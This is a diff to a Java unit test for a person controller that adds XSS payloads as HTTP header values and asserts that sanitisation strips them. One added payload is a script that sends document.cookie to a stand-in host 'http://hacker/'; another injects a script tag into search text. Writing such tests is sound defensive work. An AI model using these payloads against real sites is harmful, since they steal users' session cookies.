@@ -45,6 +45,8 @@ class PersonControllerUnitTest {
         headers.setContentType(MediaType.APPLICATION_JSON);
         headers.add("header_1", "<body onload=alert('XSS')>");
         headers.add("header_2", "<span onmousemove='doBadXss()'>");
+        headers.add("header_3", "<SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>");
+        headers.add("header_4", "<p>Your search for 'flowers <script>evil_script()</script>'");
         HttpEntity<String> request = new HttpEntity<>(personJsonObject.toString(), headers);
 
         ResponseEntity<String> personResultAsJsonStr = restTemplate.exchange(builder.toUriString(),
@@ -60,5 +62,9 @@ class PersonControllerUnitTest {
             .textValue(), "");
         assertEquals(root.get("header_2")
             .textValue(), "");
+        assertEquals(root.get("header_3")
+                .textValue(), "");
+        assertEquals(root.get("header_4")
+                .textValue(), "Your search for 'flowers '");
     }
 }
